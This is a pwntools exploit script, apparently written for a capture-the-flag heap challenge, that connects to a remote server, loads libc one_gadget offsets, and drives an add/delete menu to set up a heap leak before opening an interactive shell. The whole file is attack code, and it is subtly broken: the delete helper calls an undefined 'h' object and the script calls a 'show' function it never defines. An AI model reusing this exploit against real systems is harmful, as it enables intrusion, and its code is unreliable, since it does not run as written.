#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/12 17:48:42
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = '39.105.131.68'
    port = 12354
    sh = remote(IP,port)
    libc = ELF('./libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('pwn')

def cmd(choice):
    sh.recvuntil("choice >>")
    sh.sendline(str(choice))

def add(idx,size,content):
    cmd(1)
    sh.recvuntil("index:")
    sh.recvuntil("\n")
    sh.sendline(str(idx))
    sh.recvuntil("size:")
    sh.recvuntil("\n")
    sh.sendline(str(size))
    sh.recvuntil("content")
    sh.recvuntil("\n")
    sh.sendline(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("index:")
    h.recvuntil("\n")
    sh.sendline(str(idx))

add(0,8,"aaaa")
add(1,8,"aaaa")
add(2,8,"aaaa")
dele(0)
dele(1)
add(0,8,"a")
show(0)
sh.interactive()